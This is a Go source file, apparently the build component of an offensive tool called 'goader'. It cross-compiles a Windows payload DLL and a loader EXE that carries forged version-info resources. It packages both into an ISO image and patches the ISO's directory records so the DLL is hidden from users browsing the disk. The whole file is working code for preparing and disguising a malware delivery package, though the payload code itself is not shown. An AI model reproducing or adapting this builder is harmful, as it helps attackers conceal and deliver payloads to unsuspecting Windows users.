package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/kdomanski/iso9660"
)

func compileAll() error {
	var err error

	if err = os.MkdirAll("payloads", 0o755); err != nil {
		return errors.New("failed to create payloads directory: " + err.Error())
	}

	if err = compileDLL(); err != nil {
		return err
	}

	if err = compileEXE(); err != nil {
		return err
	}

	if flags.outputIsoFile != "" {
		if err = generateISO(); err != nil {
			return err
		}
	}

	return nil
}

func cc() string {
	if runtime.GOOS == "windows" {
		return "gcc"
	}
	return "x86_64-w64-mingw32-gcc"
}

// crossEnv returns os.Environ with the given keys stripped out, then
// appends extra. This avoids duplicate entries: Go's env lookup returns
// the FIRST match, so appending to an unfiltered os.Environ() lets any
// existing shell value (e.g. CC=gcc) silently win over ours.
func crossEnv(strip []string, extra ...string) []string {
	var (
		env     []string
		key     string
		skipSet = make(map[string]bool, len(strip))
	)

	for _, k := range strip {
		skipSet[k] = true
	}
	for _, e := range os.Environ() {
		key, _, _ = strings.Cut(e, "=")
		if !skipSet[key] {
			env = append(env, e)
		}
	}
	return append(env, extra...)
}

func compileDLL() error {
	var (
		cmd   *exec.Cmd
		err   error
		hPath string
		out   []byte
	)

	log.Printf("[+] Building %s...", flags.outputDll)
	cmd = exec.Command(
		"go", "build",
		"--buildmode=c-shared",
		"--buildvcs=false",
		"--ldflags=-s -w",
		"-o", filepath.Join("..", "payloads", flags.outputDll),
		"--tags=dll",
		"--trimpath",
		".",
	)
	cmd.Dir = "dll"
	cmd.Env = crossEnv(
		[]string{"CC", "CGO_ENABLED", "GOOS", "GOARCH"},
		"CC="+cc(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64",
	)

	if out, err = cmd.CombinedOutput(); err != nil {
		return errors.New(
			"failed to build DLL: " + err.Error() + "\n" + string(out),
		)
	}

	hPath = filepath.Join(
		"payloads",
		strings.TrimSuffix(flags.outputDll, filepath.Ext(flags.outputDll))+".h",
	)
	_ = os.Remove(hPath)

	log.Printf("[+] Built payloads/%s", flags.outputDll)
	return nil
}

func compileEXE() error {
	var (
		cmd *exec.Cmd
		err error
		out []byte
	)

	log.Printf("[+] Compiling %s...", flags.outputExe)
	cmd = exec.Command("goversioninfo", "-64")
	cmd.Dir = "goader"
	if out, err = cmd.CombinedOutput(); err != nil {
		return fmt.Errorf(
			"failed to generate EXE versioninfo: %w\n%s", err, out,
		)
	}
	if err = patchSysoMachineAMD64(
		filepath.Join("goader", "resource.syso"),
	); err != nil {
		return fmt.Errorf("failed to patch EXE versioninfo syso: %w", err)
	}

	cmd = exec.Command(
		"go", "build",
		"--buildvcs=false",
		"--ldflags=-s -w -X main.dll="+flags.outputDll,
		"-o", filepath.Join("..", "payloads", flags.outputExe),
		"--trimpath",
		".",
	)
	cmd.Dir = "goader"
	cmd.Env = crossEnv(
		[]string{"CC", "CGO_ENABLED", "GOOS", "GOARCH"},
		"CC="+cc(), "CGO_ENABLED=1", "GOOS=windows", "GOARCH=amd64",
	)

	if out, err = cmd.CombinedOutput(); err != nil {
		return errors.New(
			"failed to build EXE: " + err.Error() + "\n" + string(out),
		)
	}

	log.Printf("[+] Built payloads/%s", flags.outputExe)
	return nil
}

func generateISO() error {
	var (
		entries []fs.DirEntry
		err     error
		f       *os.File
		isoPath string
		output  *os.File
		writer  *iso9660.ImageWriter
	)

	log.Printf("[+] Generating ISO %s...", flags.outputIsoFile)
	writer, err = iso9660.NewWriter()
	if err != nil {
		return errors.New("failed to create ISO writer: " + err.Error())
	}
	defer writer.Cleanup()

	entries, err = os.ReadDir("payloads")
	if err != nil {
		return errors.New("failed to read payloads directory: " + err.Error())
	}

	for _, entry := range entries {
		if entry.IsDir() || entry.Name() == flags.outputIsoFile {
			continue
		}
		f, err = os.Open(filepath.Join("payloads", entry.Name()))
		if err != nil {
			return fmt.Errorf("failed to open %s: %w", entry.Name(), err)
		}
		err = writer.AddFile(f, entry.Name())
		f.Close()
		if err != nil {
			return errors.New(
				"failed to add " + entry.Name() + " to ISO: " + err.Error(),
			)
		}
	}

	output, err = os.OpenFile(
		filepath.Join("payloads", flags.outputIsoFile),
		os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
		0o644,
	)
	if err != nil {
		return errors.New("failed to create ISO file: " + err.Error())
	}

	if err = writer.WriteTo(output, "You've Been GOadered"); err != nil {
		output.Close()
		return errors.New("failed to write ISO: " + err.Error())
	}
	output.Close()

	isoPath = filepath.Join("payloads", flags.outputIsoFile)
	if err = setISOHiddenFlag(isoPath, flags.outputDll); err != nil {
		return fmt.Errorf("failed to set hidden flag on DLL in ISO: %w", err)
	}

	log.Printf("[+] ISO generated: payloads/%s", flags.outputIsoFile)
	return nil
}

// setISOHiddenFlag patches the ISO 9660 directory record for filename,
// setting bit 0 of the File Flags byte (the "Existence"/hidden flag) so
// that the file does not appear in default directory listings on Windows.
func setISOHiddenFlag(isoPath, filename string) error {
	const sectorSize = 2048

	var (
		drLen      int
		err        error
		f          *os.File
		fi         string
		fiLen      int
		flagOffset int64
		i          int
		pvd        []byte
		rootDir    []byte
		rootSector uint32
		rootSize   uint32
		target     string
	)

	f, err = os.OpenFile(isoPath, os.O_RDWR, 0)
	if err != nil {
		return fmt.Errorf("open: %w", err)
	}
	defer f.Close()

	// Primary Volume Descriptor lives at sector 16.
	pvd = make([]byte, sectorSize)
	if _, err = f.ReadAt(pvd, 16*sectorSize); err != nil {
		return fmt.Errorf("read PVD: %w", err)
	}

	// The Root Directory Record is embedded in the PVD at offset 156.
	// Location of Extent (LE) is at record offset 2; Data Length (LE) at
	// offset 10.
	rootSector = binary.LittleEndian.Uint32(pvd[158:162])
	rootSize = binary.LittleEndian.Uint32(pvd[166:170])

	rootDir = make([]byte, rootSize)
	if _, err = f.ReadAt(rootDir, int64(rootSector)*sectorSize); err != nil {
		return fmt.Errorf("read root directory: %w", err)
	}

	target = strings.ToUpper(filename)
	for pos := 0; pos < len(rootDir); {
		drLen = int(rootDir[pos])
		if drLen == 0 {
			// Zero padding between records; advance to next sector boundary.
			pos = (pos/sectorSize + 1) * sectorSize
			continue
		}
		if pos+drLen > len(rootDir) {
			break
		}

		fiLen = int(rootDir[pos+32])
		fi = string(rootDir[pos+33 : pos+33+fiLen])
		// ISO 9660 file identifiers include a ";1" version suffix; strip it.
		i = strings.Index(fi, ";")
		if i >= 0 {
			fi = fi[:i]
		}

		if strings.ToUpper(fi) == target {
			// File Flags is at record offset 25; bit 0 is the hidden flag.
			flagOffset = int64(rootSector)*sectorSize + int64(pos) + 25
			if _, err = f.WriteAt(
				[]byte{rootDir[pos+25] | 0x01}, flagOffset,
			); err != nil {
				return fmt.Errorf("write flag: %w", err)
			}
			return nil
		}

		pos += drLen
	}

	return fmt.Errorf("file %q not found in ISO root directory", filename)
}
